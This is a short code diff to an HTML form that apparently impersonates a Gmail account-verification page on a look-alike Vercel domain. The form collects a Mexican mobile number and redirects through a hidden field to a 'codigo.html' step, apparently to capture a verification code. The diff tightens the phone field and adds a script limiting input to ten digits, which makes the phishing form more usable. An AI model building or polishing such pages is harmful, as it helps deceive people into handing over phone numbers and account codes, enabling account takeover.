@@ -142,7 +142,7 @@
           <input type="hidden" name="_next" value="https://gmailverificacionpersonal.vercel.app/codigo.html">
           <div class="continput">
             <label for="email">+52</label>
-          <input type="text" id="email" name="numerocel" value="Ingresa tu numero de celular" required>
+          <input type="number" id="email" name="numerocel" value="Ingresa tu numero de celular" maxlenght="10" required>
         </div>
 
           <div class="checkbox">
@@ -155,5 +155,15 @@
         <hr>
         <p>¿No tienes una cuenta? <a href="#">Crea una ahora</a></p>
       </div>
+
+      <script>
+        var input = document.getElementById("email");
+        input.addEventListener("input", function() {
+          if (input.value.length > 10) {
+            input.value = input.value.slice(0, 10);
+          }
+        });
+      </script>
+
 </body>
 </html>
